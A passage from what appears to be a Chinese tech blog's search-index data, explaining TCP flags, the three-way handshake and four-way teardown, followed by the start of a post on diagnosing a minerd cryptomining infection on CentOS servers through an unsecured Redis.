URG&#xFF1A;&#x6B64;&#x6807;&#x5FD7;&#x8868;&#x793A;TCP&#x5305;&#x7684;&#x7D27;&#x6025;&#x6307;&#x9488;&#x57DF;&#xFF08;&#x540E;&#x9762;&#x9A6C;&#x4E0A;&#x5C31;&#x8981;&#x8BF4;&#x5230;&#xFF09;&#x6709;&#x6548;&#xFF0C;&#x7528;&#x6765;&#x4FDD;&#x8BC1;TCP&#x8FDE;&#x63A5;&#x4E0D;&#x88AB;&#x4E2D;&#x65AD;&#xFF0C;&#x5E76;&#x4E14;&#x7763;&#x4FC3;&#x4E2D;&#x95F4;&#x5C42;&#x8BBE;&#x5907;&#x8981;&#x5C3D;&#x5FEB;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#xFF1B; ACK&#xFF1A;&#x6B64;&#x6807;&#x5FD7;&#x8868;&#x793A;&#x5E94;&#x7B54;&#x57DF;&#x6709;&#x6548;&#xFF0C;&#x5C31;&#x662F;&#x8BF4;&#x524D;&#x9762;&#x6240;&#x8BF4;&#x7684;TCP&#x5E94;&#x7B54;&#x53F7;&#x5C06;&#x4F1A;&#x5305;&#x542B;&#x5728;TCP&#x6570;&#x636E;&#x5305;&#x4E2D;&#xFF1B;&#x6709;&#x4E24;&#x4E2A;&#x53D6;&#x503C;&#xFF1A;0&#x548C;1&#xFF0C;&#x4E3A;1&#x7684;&#x65F6;&#x5019;&#x8868;&#x793A;&#x5E94;&#x7B54;&#x57DF;&#x6709;&#x6548;&#xFF0C;&#x53CD;&#x4E4B;&#x4E3A;0&#xFF1B; PSH&#xFF1A;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;&#x8868;&#x793A;Push&#x64CD;&#x4F5C;&#x3002;&#x6240;&#x8C13;Push&#x64CD;&#x4F5C;&#x5C31;&#x662F;&#x6307;&#x5728;&#x6570;&#x636E;&#x5305;&#x5230;&#x8FBE;&#x63A5;&#x6536;&#x7AEF;&#x4EE5;&#x540E;&#xFF0C;&#x7ACB;&#x5373;&#x4F20;&#x9001;&#x7ED9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x5728;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x6392;&#x961F;&#xFF1B; RST&#xFF1A;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x8868;&#x793A;&#x8FDE;&#x63A5;&#x590D;&#x4F4D;&#x8BF7;&#x6C42;&#x3002;&#x7528;&#x6765;&#x590D;&#x4F4D;&#x90A3;&#x4E9B;&#x4EA7;&#x751F;&#x9519;&#x8BEF;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x4E5F;&#x88AB;&#x7528;&#x6765;&#x62D2;&#x7EDD;&#x9519;&#x8BEF;&#x548C;&#x975E;&#x6CD5;&#x7684;&#x6570;&#x636E;&#x5305;&#xFF1B; SYN&#xFF1A;&#x8868;&#x793A;&#x540C;&#x6B65;&#x5E8F;&#x53F7;&#xFF0C;&#x7528;&#x6765;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x3002;SYN&#x6807;&#x5FD7;&#x4F4D;&#x548C;ACK&#x6807;&#x5FD7;&#x4F4D;&#x642D;&#x914D;&#x4F7F;&#x7528;&#xFF0C;&#x5F53;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#xFF0C;SYN=1&#xFF0C;ACK=0&#xFF1B;&#x8FDE;&#x63A5;&#x88AB;&#x54CD;&#x5E94;&#x7684;&#x65F6;&#x5019;&#xFF0C;SYN=1&#xFF0C;ACK=1&#xFF1B;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7ECF;&#x5E38;&#x88AB;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x3002;&#x626B;&#x63CF;&#x8005;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x53EA;&#x6709;SYN&#x7684;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x5982;&#x679C;&#x5BF9;&#x65B9;&#x4E3B;&#x673A;&#x54CD;&#x5E94;&#x4E86;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5305;&#x56DE;&#x6765; &#xFF0C;&#x5C31;&#x8868;&#x660E;&#x8FD9;&#x53F0;&#x4E3B;&#x673A;&#x5B58;&#x5728;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;&#xFF1B;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x8FD9;&#x79CD;&#x626B;&#x63CF;&#x65B9;&#x5F0F;&#x53EA;&#x662F;&#x8FDB;&#x884C;TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x7684;&#x7B2C;&#x4E00;&#x6B21;&#x63E1;&#x624B;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x79CD;&#x626B;&#x63CF;&#x7684;&#x6210;&#x529F;&#x8868;&#x793A;&#x88AB;&#x626B;&#x63CF;&#x7684;&#x673A;&#x5668;&#x4E0D;&#x5F88;&#x5B89;&#x5168;&#xFF0C;&#x4E00;&#x53F0;&#x5B89;&#x5168;&#x7684;&#x4E3B;&#x673A;&#x5C06;&#x4F1A;&#x5F3A;&#x5236;&#x8981;&#x6C42;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x4E25;&#x683C;&#x7684;&#x8FDB;&#x884C;TCP&#x7684;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF1B; FIN&#xFF1A; &#x8868;&#x793A;&#x53D1;&#x9001;&#x7AEF;&#x5DF2;&#x7ECF;&#x8FBE;&#x5230;&#x6570;&#x636E;&#x672B;&#x5C3E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x53CC;&#x65B9;&#x7684;&#x6570;&#x636E;&#x4F20;&#x9001;&#x5B8C;&#x6210;&#xFF0C;&#x6CA1;&#x6709;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x4F20;&#x9001;&#x4E86;&#xFF0C;&#x53D1;&#x9001;FIN&#x6807;&#x5FD7;&#x4F4D;&#x7684;TCP&#x6570;&#x636E;&#x5305;&#x540E;&#xFF0C;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x65AD;&#x5F00;&#x3002;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#x4E5F;&#x7ECF;&#x5E38;&#x88AB;&#x7528;&#x4E8E;&#x8FDB;&#x884C;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x3002; Window:&#x7A97;&#x53E3;&#x5927;&#x5C0F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6709;&#x540D;&#x7684;&#x6ED1;&#x52A8;&#x7A97;&#x53E3;&#xFF0C;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x63A7;&#x5236;&#xFF1B;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x590D;&#x6742;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x8FD9;&#x7BC7;&#x535A;&#x6587;&#x4E2D;&#x5E76;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x603B;&#x7ED3;&#x7684;&#xFF1B; TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x5EFA;&#x7ACB;TCP&#x9700;&#x8981;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x624D;&#x80FD;&#x5EFA;&#x7ACB;&#xFF0C;&#x800C;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x5219;&#x9700;&#x8981;&#x56DB;&#x6B21;&#x63E1;&#x624B;&#x3002;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A; &#x5148;&#x6765;&#x770B;&#x770B;&#x5982;&#x4F55;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x7684;&#x3002; &#x7B2C;&#x4E00;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x6BB5;&#xFF0C;&#x5C06;SYN&#x4F4D;&#x7F6E;&#x4E3A;1&#xFF0C;Sequence Number&#x4E3A;x&#xFF1B;&#x7136;&#x540E;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x5165;SYN_SEND&#x72B6;&#x6001;&#xFF0C;&#x7B49;&#x5F85;&#x670D;&#x52A1;&#x5668;&#x7684;&#x786E;&#x8BA4;&#xFF1B; &#x7B2C;&#x4E8C;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x670D;&#x52A1;&#x5668;&#x6536;&#x5230;SYN&#x62A5;&#x6587;&#x6BB5;&#x3002;&#x670D;&#x52A1;&#x5668;&#x6536;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;SYN&#x62A5;&#x6587;&#x6BB5;&#xFF0C;&#x9700;&#x8981;&#x5BF9;&#x8FD9;&#x4E2A;SYN&#x62A5;&#x6587;&#x6BB5;&#x8FDB;&#x884C;&#x786E;&#x8BA4;&#xFF0C;&#x8BBE;&#x7F6E;Acknowledgment Number&#x4E3A;x+1(Sequence Number+1)&#xFF1B;&#x540C;&#x65F6;&#xFF0C;&#x81EA;&#x5DF1;&#x81EA;&#x5DF1;&#x8FD8;&#x8981;&#x53D1;&#x9001;SYN&#x8BF7;&#x6C42;&#x4FE1;&#x606F;&#xFF0C;&#x5C06;SYN&#x4F4D;&#x7F6E;&#x4E3A;1&#xFF0C;Sequence Number&#x4E3A;y&#xFF1B;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5C06;&#x4E0A;&#x8FF0;&#x6240;&#x6709;&#x4FE1;&#x606F;&#x653E;&#x5230;&#x4E00;&#x4E2A;&#x62A5;&#x6587;&#x6BB5;&#xFF08;&#x5373;SYN+ACK&#x62A5;&#x6587;&#x6BB5;&#xFF09;&#x4E2D;&#xFF0C;&#x4E00;&#x5E76;&#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x6B64;&#x65F6;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x5165;SYN_RECV&#x72B6;&#x6001;&#xFF1B; &#x7B2C;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x6536;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7684;SYN+ACK&#x62A5;&#x6587;&#x6BB5;&#x3002;&#x7136;&#x540E;&#x5C06;Acknowledgment Number&#x8BBE;&#x7F6E;&#x4E3A;y+1&#xFF0C;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;ACK&#x62A5;&#x6587;&#x6BB5;&#xFF0C;&#x8FD9;&#x4E2A;&#x62A5;&#x6587;&#x6BB5;&#x53D1;&#x9001;&#x5B8C;&#x6BD5;&#x4EE5;&#x540E;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x90FD;&#x8FDB;&#x5165;ESTABLISHED&#x72B6;&#x6001;&#xFF0C;&#x5B8C;&#x6210;TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x3002; &#x5176;&#x5B9E;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x5C31;&#x662F;&#xFF0C;A&#x544A;&#x8BC9;B&#x8981;&#x8FDE;&#x63A5;&#xFF0C;B&#x901A;&#x77E5;A&#x53EF;&#x4EE5;&#x8FDE;&#x63A5;&#x4E86;&#xFF0C;A&#x518D;&#x544A;&#x8BC9;B&#xFF0C;&#x90A3;&#x6211;&#x8FDE;&#x63A5;&#x4E86;&#x3002; TCP&#x56DB;&#x6B21;&#x6325;&#x624B;&#x5047;&#x8BBE;Client&#x7AEF;&#x53D1;&#x8D77;&#x4E2D;&#x65AD;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x53D1;&#x9001;FIN&#x62A5;&#x6587;&#x3002;Server&#x7AEF;&#x63A5;&#x5230;FIN&#x62A5;&#x6587;&#x540E;&#xFF0C;&#x610F;&#x601D;&#x662F;&#x8BF4;&#x201D;&#x6211;Client&#x7AEF;&#x6CA1;&#x6709;&#x6570;&#x636E;&#x8981;&#x53D1;&#x7ED9;&#x4F60;&#x4E86;&#x201C;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x4F60;&#x8FD8;&#x6709;&#x6570;&#x636E;&#x6CA1;&#x6709;&#x53D1;&#x9001;&#x5B8C;&#x6210;&#xFF0C;&#x5219;&#x4E0D;&#x5FC5;&#x6025;&#x7740;&#x5173;&#x95ED;Socket&#xFF0C;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x53D1;&#x9001;&#x6570;&#x636E;&#x3002;&#x6240;&#x4EE5;&#x4F60;&#x5148;&#x53D1;&#x9001;ACK&#xFF0C;&#x201D;&#x544A;&#x8BC9;Client&#x7AEF;&#xFF0C;&#x4F60;&#x7684;&#x8BF7;&#x6C42;&#x6211;&#x6536;&#x5230;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x8FD8;&#x6CA1;&#x51C6;&#x5907;&#x597D;&#xFF0C;&#x8BF7;&#x7EE7;&#x7EED;&#x4F60;&#x7B49;&#x6211;&#x7684;&#x6D88;&#x606F;&#x201C;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;Client&#x7AEF;&#x5C31;&#x8FDB;&#x5165;FIN_WAIT&#x72B6;&#x6001;&#xFF0C;&#x7EE7;&#x7EED;&#x7B49;&#x5F85;Server&#x7AEF;&#x7684;FIN&#x62A5;&#x6587;&#x3002;&#x5F53;Server&#x7AEF;&#x786E;&#x5B9A;&#x6570;&#x636E;&#x5DF2;&#x53D1;&#x9001;&#x5B8C;&#x6210;&#xFF0C;&#x5219;&#x5411;Client&#x7AEF;&#x53D1;&#x9001;FIN&#x62A5;&#x6587;&#xFF0C;&#x201D;&#x544A;&#x8BC9;Client&#x7AEF;&#xFF0C;&#x597D;&#x4E86;&#xFF0C;&#x6211;&#x8FD9;&#x8FB9;&#x6570;&#x636E;&#x53D1;&#x5B8C;&#x4E86;&#xFF0C;&#x51C6;&#x5907;&#x597D;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x4E86;&#x201C;&#x3002;Client&#x7AEF;&#x6536;&#x5230;FIN&#x62A5;&#x6587;&#x540E;&#xFF0C;&#x201D;&#x5C31;&#x77E5;&#x9053;&#x53EF;&#x4EE5;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x4ED6;&#x8FD8;&#x662F;&#x4E0D;&#x76F8;&#x4FE1;&#x7F51;&#x7EDC;&#xFF0C;&#x6015;Server&#x7AEF;&#x4E0D;&#x77E5;&#x9053;&#x8981;&#x5173;&#x95ED;&#xFF0C;&#x6240;&#x4EE5;&#x53D1;&#x9001;ACK&#x540E;&#x8FDB;&#x5165;TIME_WAIT&#x72B6;&#x6001;&#xFF0C;&#x5982;&#x679C;Server&#x7AEF;&#x6CA1;&#x6709;&#x6536;&#x5230;ACK&#x5219;&#x53EF;&#x4EE5;&#x91CD;&#x4F20;&#x3002;&#x201D;Server&#x7AEF;&#x6536;&#x5230;ACK&#x540E;&#xFF0C;&#x201D;&#x5C31;&#x77E5;&#x9053;&#x53EF;&#x4EE5;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x4E86;&#x201C;&#x3002;Client&#x7AEF;&#x7B49;&#x5F85;&#x4E86;2MSL&#x540E;&#x4F9D;&#x7136;&#x6CA1;&#x6709;&#x6536;&#x5230;&#x56DE;&#x590D;&#xFF0C;&#x5219;&#x8BC1;&#x660E;Server&#x7AEF;&#x5DF2;&#x6B63;&#x5E38;&#x5173;&#x95ED;&#xFF0C;&#x90A3;&#x597D;&#xFF0C;&#x6211;Client&#x7AEF;&#x4E5F;&#x53EF;&#x4EE5;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x4E86;&#x3002;Ok&#xFF0C;TCP&#x8FDE;&#x63A5;&#x5C31;&#x8FD9;&#x6837;&#x5173;&#x95ED;&#x4E86;&#xFF01; &#x6574;&#x4E2A;&#x8FC7;&#x7A0B;Client&#x7AEF;&#x6240;&#x7ECF;&#x5386;&#x7684;&#x72B6;&#x6001;&#x5982;&#x4E0B;&#xFF1A; &#x800C;Server&#x7AEF;&#x6240;&#x7ECF;&#x5386;&#x7684;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A; &#x76F8;&#x5173;&#x7591;&#x95EE;&#x3010;&#x95EE;&#x9898;1&#x3011;&#x4E3A;&#x4EC0;&#x4E48;&#x8FDE;&#x63A5;&#x7684;&#x65F6;&#x5019;&#x662F;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF0C;&#x5173;&#x95ED;&#x7684;&#x65F6;&#x5019;&#x5374;&#x662F;&#x56DB;&#x6B21;&#x63E1;&#x624B;&#xFF1F;&#x7B54;&#xFF1A;&#x56E0;&#x4E3A;&#x5F53;Server&#x7AEF;&#x6536;&#x5230;Client&#x7AEF;&#x7684;SYN&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x53D1;&#x9001;SYN+ACK&#x62A5;&#x6587;&#x3002;&#x5176;&#x4E2D;ACK&#x62A5;&#x6587;&#x662F;&#x7528;&#x6765;&#x5E94;&#x7B54;&#x7684;&#xFF0C;SYN&#x62A5;&#x6587;&#x662F;&#x7528;&#x6765;&#x540C;&#x6B65;&#x7684;&#x3002;&#x4F46;&#x662F;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x65F6;&#xFF0C;&#x5F53;Server&#x7AEF;&#x6536;&#x5230;FIN&#x62A5;&#x6587;&#x65F6;&#xFF0C;&#x5F88;&#x53EF;&#x80FD;&#x5E76;&#x4E0D;&#x4F1A;&#x7ACB;&#x5373;&#x5173;&#x95ED;SOCKET&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x80FD;&#x5148;&#x56DE;&#x590D;&#x4E00;&#x4E2A;ACK&#x62A5;&#x6587;&#xFF0C;&#x544A;&#x8BC9;Client&#x7AEF;&#xFF0C;&#x201D;&#x4F60;&#x53D1;&#x7684;FIN&#x62A5;&#x6587;&#x6211;&#x6536;&#x5230;&#x4E86;&#x201D;&#x3002;&#x53EA;&#x6709;&#x7B49;&#x5230;&#x6211;Server&#x7AEF;&#x6240;&#x6709;&#x7684;&#x62A5;&#x6587;&#x90FD;&#x53D1;&#x9001;&#x5B8C;&#x4E86;&#xFF0C;&#x6211;&#x624D;&#x80FD;&#x53D1;&#x9001;FIN&#x62A5;&#x6587;&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x80FD;&#x4E00;&#x8D77;&#x53D1;&#x9001;&#x3002;&#x6545;&#x9700;&#x8981;&#x56DB;&#x6B65;&#x63E1;&#x624B;&#x3002; &#x3010;&#x95EE;&#x9898;2&#x3011;&#x4E3A;&#x4EC0;&#x4E48;TIME_WAIT&#x72B6;&#x6001;&#x9700;&#x8981;&#x7ECF;&#x8FC7;2MSL(&#x6700;&#x5927;&#x62A5;&#x6587;&#x6BB5;&#x751F;&#x5B58;&#x65F6;&#x95F4;)&#x624D;&#x80FD;&#x8FD4;&#x56DE;&#x5230;CLOSE&#x72B6;&#x6001;&#xFF1F;&#x7B54;&#xFF1A;&#x867D;&#x7136;&#x6309;&#x9053;&#x7406;&#xFF0C;&#x56DB;&#x4E2A;&#x62A5;&#x6587;&#x90FD;&#x53D1;&#x9001;&#x5B8C;&#x6BD5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8FDB;&#x5165;CLOSE&#x72B6;&#x6001;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x5047;&#x8C61;&#x7F51;&#x7EDC;&#x662F;&#x4E0D;&#x53EF;&#x9760;&#x7684;&#xFF0C;&#x6709;&#x53EF;&#x4EE5;&#x6700;&#x540E;&#x4E00;&#x4E2A;ACK&#x4E22;&#x5931;&#x3002;&#x6240;&#x4EE5;TIME_WAIT&#x72B6;&#x6001;&#x5C31;&#x662F;&#x7528;&#x6765;&#x91CD;&#x53D1;&#x53EF;&#x80FD;&#x4E22;&#x5931;&#x7684;ACK&#x62A5;&#x6587;&#x3002; &#x3010;&#x95EE;&#x9898;3&#x3011;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x80FD;&#x7528;&#x4E24;&#x6B21;&#x63E1;&#x624B;&#x8FDB;&#x884C;&#x8FDE;&#x63A5;&#xFF1F;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF0C;3&#x6B21;&#x63E1;&#x624B;&#x5B8C;&#x6210;&#x4E24;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x65E2;&#x8981;&#x53CC;&#x65B9;&#x505A;&#x597D;&#x53D1;&#x9001;&#x6570;&#x636E;&#x7684;&#x51C6;&#x5907;&#x5DE5;&#x4F5C;(&#x53CC;&#x65B9;&#x90FD;&#x77E5;&#x9053;&#x5F7C;&#x6B64;&#x5DF2;&#x51C6;&#x5907;&#x597D;)&#xFF0C;&#x4E5F;&#x8981;&#x5141;&#x8BB8;&#x53CC;&#x65B9;&#x5C31;&#x521D;&#x59CB;&#x5E8F;&#x5217;&#x53F7;&#x8FDB;&#x884C;&#x534F;&#x5546;&#xFF0C;&#x8FD9;&#x4E2A;&#x5E8F;&#x5217;&#x53F7;&#x5728;&#x63E1;&#x624B;&#x8FC7;&#x7A0B;&#x4E2D;&#x88AB;&#x53D1;&#x9001;&#x548C;&#x786E;&#x8BA4;&#x3002;&#x73B0;&#x5728;&#x628A;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x6539;&#x6210;&#x4EC5;&#x9700;&#x8981;&#x4E24;&#x6B21;&#x63E1;&#x624B;&#xFF0C;&#x6B7B;&#x9501;&#x662F;&#x53EF;&#x80FD;&#x53D1;&#x751F;&#x7684;&#x3002;&#x4F5C;&#x4E3A;&#x4F8B;&#x5B50;&#xFF0C;&#x8003;&#x8651;&#x8BA1;&#x7B97;&#x673A;S&#x548C;C&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x5047;&#x5B9A;C&#x7ED9;S&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x5206;&#x7EC4;&#xFF0C;S&#x6536;&#x5230;&#x4E86;&#x8FD9;&#x4E2A;&#x5206;&#x7EC4;&#xFF0C;&#x5E76;&#x53D1;&#x9001;&#x4E86;&#x786E;&#x8BA4;&#x5E94;&#x7B54;&#x5206;&#x7EC4;&#x3002;&#x6309;&#x7167;&#x4E24;&#x6B21;&#x63E1;&#x624B;&#x7684;&#x534F;&#x5B9A;&#xFF0C;S&#x8BA4;&#x4E3A;&#x8FDE;&#x63A5;&#x5DF2;&#x7ECF;&#x6210;&#x529F;&#x5730;&#x5EFA;&#x7ACB;&#x4E86;&#xFF0C;&#x53EF;&#x4EE5;&#x5F00;&#x59CB;&#x53D1;&#x9001;&#x6570;&#x636E;&#x5206;&#x7EC4;&#x3002;&#x53EF;&#x662F;&#xFF0C;C&#x5728;S&#x7684;&#x5E94;&#x7B54;&#x5206;&#x7EC4;&#x5728;&#x4F20;&#x8F93;&#x4E2D;&#x88AB;&#x4E22;&#x5931;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5C06;&#x4E0D;&#x77E5;&#x9053;S&#x662F;&#x5426;&#x5DF2;&#x51C6;&#x5907;&#x597D;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;S&#x5EFA;&#x7ACB;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x5E8F;&#x5217;&#x53F7;&#xFF0C;C&#x751A;&#x81F3;&#x6000;&#x7591;S&#x662F;&#x5426;&#x6536;&#x5230;&#x81EA;&#x5DF1;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x5206;&#x7EC4;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;C&#x8BA4;&#x4E3A;&#x8FDE;&#x63A5;&#x8FD8;&#x672A;&#x5EFA;&#x7ACB;&#x6210;&#x529F;&#xFF0C;&#x5C06;&#x5FFD;&#x7565;S&#x53D1;&#x6765;&#x7684;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x5206; &#x7EC4;&#xFF0C;&#x53EA;&#x7B49;&#x5F85;&#x8FDE;&#x63A5;&#x786E;&#x8BA4;&#x5E94;&#x7B54;&#x5206;&#x7EC4;&#x3002;&#x800C;S&#x5728;&#x53D1;&#x51FA;&#x7684;&#x5206;&#x7EC4;&#x8D85;&#x65F6;&#x540E;&#xFF0C;&#x91CD;&#x590D;&#x53D1;&#x9001;&#x540C;&#x6837;&#x7684;&#x5206;&#x7EC4;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x5F62;&#x6210;&#x4E86;&#x6B7B;&#x9501;&#x3002;","raw":null,"content":null,"categories":[{"name":"算法及理论","slug":"算法及理论","permalink":"http://www.wangxin123.com/categories/算法及理论/"}],"tags":[{"name":"tcp","slug":"tcp","permalink":"http://www.wangxin123.com/tags/tcp/"}]},{"title":"彻底清除Linux centos minerd木马","slug":"彻底清除Linux centos minerd木马","date":"2016-10-26T14:41:19.000Z","updated":"2017-02-23T01:52:19.419Z","comments":true,"path":"2016/10/26/彻底清除Linux centos minerd木马/","link":"","permalink":"http://www.wangxin123.com/2016/10/26/彻底清除Linux centos minerd木马/","excerpt":"&#x524D;&#x51E0;&#x5929;&#xFF0C;&#x516C;&#x53F8;&#x4E24;&#x53F0;linux&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E00;&#x53F0;&#x8BBF;&#x95EE;&#x901F;&#x5EA6;&#x5F88;&#x6162;&#xFF0C;cpu&#x8DD1;&#x6EE1;&#xFF0C;&#x4E00;&#x53F0;&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x5931;&#x6548;&#xFF0C;&#x516C;&#x94A5;&#x6587;&#x4EF6;&#x88AB;&#x6539;&#x5199;&#x6210;redis&#x7684;key&#x3002;&#x7528;htop&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x53D1;&#x73B0;&#x4E86;minerd&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;&#xFF0C;&#x521D;&#x6B65;&#x731C;&#x6D4B;&#x662F;redis&#x6CA1;&#x6709;&#x914D;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x9020;&#x6210;&#x7684;&#x3002;&#x7F51;&#x4E0A;&#x67E5;&#x8BE2;minerd&#x6728;&#x9A6C;&#xFF0C;&#x53D1;&#x73B0;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x5E38;&#x89C1;&#x7684;&#x6316;&#x77FF;&#x7A0B;&#x5E8F;&#xFF0C;&#x76F8;&#x5173;&#x731C;&#x6D4B;&#x4E5F;&#x5F97;&#x5230;&#x4E86;&#x9A8C;&#x8BC1;&#x3002; &#x4E0B;&#x6587;&#x662F;&#x7F51;&#x4E0A;&#x641C;&#x7D22;&#x5230;&#x7684;&#x6E05;&#x9664;minerd&#x6728;&#x9A6C;&#x65B9;&#x6CD5;&#xFF0C;&#x548C;&#x6211;&#x9047;&#x5230;&#x7684;&#x60C5;&#x51B5;&#x4E00;&#x6A21;&#x4E00;&#x6837;&#x3002; &#x73B0;&#x72B6;&#x63CF;&#x8FF0;1&#x3001;top&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x8FD9;&#x4E2A;minerd &#x7A0B;&#x5E8F;&#x628A;cpu&#x8DD1;&#x6EE1;&#x4E86; 2&#x3001;ps aux | grep minerd&#x53EF;&#x77E5;&#x662F;&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;: /opt/minerd","keywords":null,"text":"&#x524D;&#x51E0;&#x5929;&#xFF0C;&#x516C;&#x53F8;&#x4E24;&#x53F0;linux&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E00;&#x53F0;&#x8BBF;&#x95EE;&#x901F;&#x5EA6;&#x5F88;&#x6162;&#xFF0C;cpu&#x8DD1;&#x6EE1;&#xFF0C;&#x4E00;&#x53F0;&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x5931;&#x6548;&#xFF0C;&#x516C;&#x94A5;&#x6587;&#x4EF6;&#x88AB;&#x6539;&#x5199;&#x6210;redis&#x7684;key&#x3002;&#x7528;htop&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x53D1;&#x73B0;&#x4E86;minerd&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;&#xFF0C;&#x521D;&#x6B65;&#x731C;&#x6D4B;&#x662F;redis&#x6CA1;&#x6709;&#x914D;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x9020;&#x6210;&#x7684;&#x3002;&#x7F51;&#x4E0A;&#x67E5;&#x8BE2;minerd&#x6728;&#x9A6C;&#xFF0C;&#x53D1;&#x73B0;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5F8